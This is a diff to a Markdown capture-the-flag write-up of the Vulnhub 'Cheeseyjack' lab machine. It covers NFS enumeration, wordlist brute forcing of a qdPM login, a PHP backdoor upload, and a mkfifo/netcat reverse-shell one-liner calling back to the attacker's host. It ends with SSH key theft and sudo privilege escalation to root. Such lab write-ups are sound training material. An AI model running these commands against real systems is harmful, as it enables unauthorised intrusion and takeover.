@@ -1,7 +1,7 @@
 ---
 title: Write-up Cheeseyjack on Vulnhub
 author: eMVee
-date: 2033-05-03 20:00:00 +0800
+date: 2023-05-03 20:00:00 +0800
 categories: [Vulnhub, CTF]
 tags: [Vulnhub, OSCP]
 render_with_liquid: false
@@ -313,13 +313,11 @@ Let's mount the share to enumerate some more information from the share.
 ┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
 └─$ sudo mount -o nolock $ip:/home/ch33s3m4n /home/emvee/Documents/Vulnhub/CheeceyJack/ch33s3m4n 
 ```
-
+Now we should change the working directory to the mounted share and discover what directories and files are shared.
 ```bash
 ┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
 └─$ cd /home/emvee/Documents/Vulnhub/CheeceyJack/ch33s3m4n
-```
 
-```bash
 ┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack/ch33s3m4n]
 └─$ ls
 Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
@@ -341,7 +339,8 @@ It looks like there is a file qdPM9.1zip present in the home directory. Let's ke
 ┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
 └─$ dirsearch -u http://$ip -e php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
-  _|. _ _  _  _  _ _|_    v0.4.2                                        (_||| _) (/_(_|| (_| ) 
+   _|. _ _  _  _  _ _|_    v0.4.2                                        
+  (_||| _) (/_(_|| (_| ) 
  
 Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 220545
 
@@ -357,11 +356,13 @@ Target: http://10.0.2.42/
 [16:48:57] 301 -  319B  - /project_management  ->  http://10.0.2.42/project_management/
 
 ```
-While dirsearch is still running and I already noticed a interesting directory name we should enumerate the website itself as well.
+While dirsearch is still running and I already noticed a interesting directory name we should enumerate the website it self as well.
 
-![[Pasted image 20230503165330.png]]
+![Image](/assets/img/WriteUp/Vulnhub/Cheeseyjack/Pasted image 20230503165330.png){: width="700" height="400" }
 
-![[Pasted image 20230503165412.png]]
+There is a `contact us` page, we should see if we can find anything useful.
+![Image](/assets/img/WriteUp/Vulnhub/Cheeseyjack/Pasted image 20230503165412.png){: width="700" height="400" }
+
 There is the email address again. Let's update a email addresses list with the found one and craft a email address for `ch33se3m4n`.
 
 ```email-addresses
@@ -369,7 +370,8 @@ info@cheeseyjack.local
 ch33s3m4n@cheeseyjack.local
 ```
 After looking at the website, let's check the diriectory `project_management` found by dirsearch.
-![[Pasted image 20230503165729.png]]
+![Image](/assets/img/WriteUp/Vulnhub/Cheeseyjack/Pasted image 20230503165729.png){: width="700" height="400" }
+
 A logon page is shown. Even a version of this application is shown. It is the same as in the Downloads folder which we have seen earlier. Perhaps there is a vulnerbaility known for this version. Let's check that with searchsploit.
 
 ```bash
@@ -410,7 +412,7 @@ Let's create a usernames list containt with the email addresses since the userna
 info@cheeseyjack.local
 ch33s3m4n@cheeseyjack.local
 ```
-
+We need a password list to brute force the credentials. My strategy is to create a wordlist based on the main website and on the project management tool.
 ```bash
 ┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
 └─$ cewl http://$ip/project_management -d 4 -m 4 -w passwords1.txt
@@ -468,7 +470,7 @@ The password is: qdpm
 Finished!
 
 ```
-
+We got a valid username and password found by brute forcing. With this information we can run the exploit to upload a malicious file what helps us execute commands from our target.
 
 ```bash
 ┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
@@ -478,7 +480,7 @@ You are not able to use the designated admin account because they do not have a 
 The DateStamp is 2023-05-04 09:59 
 Backdoor uploaded at - > http://10.0.2.42/project_management/uploads/users/639322-backdoor.php?cmd=whoami
 ```
-
+An example how we should executed the command via the URL is shown to us. Now let's use curl to see what we get back.
 ```bash
 ┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
 └─$ curl -v http://10.0.2.42/project_management/uploads/users/639322-backdoor.php?cmd=whoami                                                      
@@ -500,7 +502,7 @@ Backdoor uploaded at - > http://10.0.2.42/project_management/uploads/users/63932
 * Connection #0 to host 10.0.2.42 left intact
 </pre>   
 ```
-
+It looks like `www-data` is running our commands. Now we could create a netcat listener and run a command to establish a reverse shell.
 
 ```bash
 ┌──(emvee㉿kali)-[~]
@@ -511,8 +513,7 @@ Ncat: Listening on :::443
 Ncat: Listening on 0.0.0.0:443
 
 ```
-
-
+Now we should run our command for a reverse shell including the data url encoding so it is executed correctly on the target.
 ```bash
 ┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
 └─$ curl -v http://10.0.2.42/project_management/uploads/users/639322-backdoor.php --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.2.15 443 >/tmp/f"
@@ -530,10 +531,8 @@ Ncat: Listening on 0.0.0.0:443
 
 ```
 
-
-------
 ## Initial access
-
+We should check our netcat listener to see if the connection has been established.
 ```bash
 ┌──(emvee㉿kali)-[~]
 └─$ sudo rlwrap nc -lvp 443         
@@ -548,7 +547,7 @@ bash: no job control in this shell
 www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ 
 
 ```
-
+Let's find out who we are, what memberships we have and on what host we are working.
 ```bash
 www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ whoami;id;hostname
 <roject_management/uploads/users$ whoami;id;hostname                 
@@ -557,7 +556,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 cheeseyjack
 
 ```
-
+We are running our commands as `www-data`, we should gain more privileges on our victim. It's about time to enumerate some users on the system.
 ```bash
 www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
 < '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd                 
@@ -569,8 +568,8 @@ ch33s3m4n
 crab
 
 ```
-
-
+There are two users on the system, both with a home directory. Perhaps there are some interesting files in their home directories.
+We should enumerate them.
 ```bash
 www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ ls -ahlR /home
 <ml/project_management/uploads/users$ ls -ahlR /home                 
@@ -600,7 +599,7 @@ drwxrwxr-x  2 crab crab 4.0K Sep 24  2020 Videos
 
 <=== SNIP ===>
 ```
-There is a todo.txt file available. We 
+There is a `todo.txt` file available. We should inspect this file.
 ```bash
 www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ cat /home/crab/todo.txt
 <t_management/uploads/users$ cat /home/crab/todo.txt                 
@@ -612,7 +611,7 @@ www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ cat /home/c
 6. Stop putting my grocery list on my todo lists
 www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ 
 ```
-
+The todo mentions something about a backup of SSH keys in `/var/backups`. This sounds very interesting, so let's see what we can discover there.
 ```bash
 www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ cd /var/backups
 <l/project_management/uploads/users$ cd /var/backups                 
@@ -636,11 +635,8 @@ dpkg.status.2.gz
 ssh-bak
 
 ```
-
+There is an SSH-bak directory available. We should look into this to see what it contains. If there is a SSH key, we could just use it.
 ```bash
-www-data@cheeseyjack:/var/backups$ cat ssh-bak
-cat ssh-bak
-cat: ssh-bak: Is a directory
 www-data@cheeseyjack:/var/backups$ cd ssh-bak
 cd ssh-bak
 www-data@cheeseyjack:/var/backups/ssh-bak$ ls
@@ -689,7 +685,7 @@ WjkC55loKLSn2now5KOMNHWhmsKPjPhKXQL/NLU9gZQdamoTfijCNqZIitj8j2Xa6JGbMu
 www-data@cheeseyjack:/var/backups/ssh-bak$ 
 
 ```
-
+Let's copy the contents of the SSH key and create a key on our Kali. We can then paste the content into the key and save it. Of course, the rights still have to be set correctly. If this is not done, we will receive a message that the permissions are not set correctly.
 ```bash
 ┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
 └─$ nano priv.key 
@@ -698,10 +694,9 @@ www-data@cheeseyjack:/var/backups/ssh-bak$
 └─$ chmod 600 priv.key     
 ```
 
-
 -----
 ## Privilege escalation
-
+Time to try logging in with crab and the SSH key.
 ```bash
 ┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
 └─$ ssh crab@$ip -i priv.key                                                                     
@@ -727,7 +722,7 @@ See "man sudo_root" for details.
 crab@cheeseyjack:~$ 
 
 ```
-
+We were able to successfully log in as a crab on the SSH service. Let's see if crab also has sudo rights.
 ```bash
 crab@cheeseyjack:~$ sudo -l
 Matching Defaults entries for crab on cheeseyjack:
@@ -739,17 +734,22 @@ User crab may run the following commands on cheeseyjack:
 crab@cheeseyjack:~$ 
 
 ```
-
-
+We have sudo rights to everything in the following directory `/home/crab/.bin/`. Let's first see what's in this directory.
 ```bash
 crab@cheeseyjack:~$ ls /home/crab/.bin/
 ping
 ```
-
+Let's create a bash script that starts an interactive shell. Then we need to set the permissions so that the file is executable. For convenience, I give all rights to everyone. This is not safe and you should not just do it in a production environment.
 ```bash
 crab@cheeseyjack:~/.bin$ echo '/bin/bash -i' > root.sh
 crab@cheeseyjack:~/.bin$ chmod 777 root.sh
+```
+Now that the file has the correct permissions we can run it as with sudo. If all goes well, an interactive shell will be started with elevated rights.
+```bash
 crab@cheeseyjack:~/.bin$ sudo ./root.sh 
+```
+We can enter commands again. Let's see who we are, what membership I have as user and what machine we are working on.
+```bash
 root@cheeseyjack:/home/crab/.bin# whoami;id;hostname;ifconfig
 root
 uid=0(root) gid=0(root) groups=0(root)
@@ -774,6 +774,9 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 root@cheeseyjack:/home/crab/.bin# ls /root
 root.txt
+```
+Looks like we're root and it's time to capture the root flag!
+```bash
 root@cheeseyjack:/home/crab/.bin# cat /root/root.txt
                     ___ _____
                    /\ (_)    \
@@ -792,7 +795,7 @@ Tag me on twitter @cheesewadd with this picture and i'll give you a RT!
 
 
 ```
-
+Well, since the machine was owned fully and I forgot to see what Linux distro and kernel was used, I had to execute some commands to make my notes complete.
 ```bash
 root@cheeseyjack:/home/crab/.bin# uname -a
 Linux cheeseyjack 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
